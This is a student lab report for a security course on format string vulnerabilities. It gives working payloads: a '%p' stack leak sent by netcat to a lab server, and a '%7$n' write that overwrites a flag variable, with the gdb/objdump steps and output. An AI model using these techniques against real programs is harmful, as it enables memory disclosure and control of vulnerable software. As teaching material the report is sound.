# CS6570 Report Lab 3 Format String Vulnerability

## *Instructions to run:*
* *inputx.py* files when run create *payloadx.exp* file in the directory.
* For Problem 1:
```
$ netcat 10.21.235.155 1023 < payload1.exp 
```
* For Problem 2:
```
$ ./flag < payload2.exp
```

## *Problem 1*
* As mentioned the neccessary bytes are present on the stack thus we make a payload which just prints on the stack information.
* Payload used:
```
payload = b"%p."*11 + b"\n"
```
* *payload1.exp* has 3 lines for username, password, and last exit line.
* Password line has the payload


## *Problem 2*
* There is a printf vulnerability which stores the input in a given buffer which can be used to access the flag value.
* First we ran the below payload to find the position of the buffer on the stack
```
payload = b"A"*4 + b"|" + b"%x."*10
```
* And we get the output:
```
Your input:
AAAA|f7fa35ee.804821c.80484cd.f7fcdb8c.1.f7f916a0.41414141.252e7825.78252e78.2e78252e.
flag = 0
```
* We get the position of the buffer as 7th position from %esp.
* We need to place the address of given flag in the buffer.
* To find it we access objdump of flag and in main we find a *cmp* of eax with 100(0x64).
```
 8048526:	83 c4 10             	add    $0x10,%esp
 8048529:	8b 83 2c 00 00 00    	mov    0x2c(%ebx),%eax
 804852f:	83 f8 64             	cmp    $0x64,%eax
 8048532:	75 14                	jne    8048548 <main+0x92>
 ```
* We see that the address of flag is ebx + 0x2c before instruction 0x0804852f
* On using gdb with breakpoint before the cmp instruction we find the value stored in ebx as 0x0804a000
* Thus the flag address is 0x0804a02c
* We must store the address into the buffer and call send *%7$n* as an input to the buffer.
* To make the value sent to flag as 100(0x64) we send an additional *%96x*.
* Thus the payload is effectively :
```
payload = b"\x2c\xa0\x04\x08"
payload += b"%96x" + b"%7$n"
```

* On running this payload after storing it in payload2.exp :

```
./flag < payload2.exp
```
* We get output :
```
Your input:
,�                                                                                        f7f8a5ee
flag = 100

The system is compromised
```

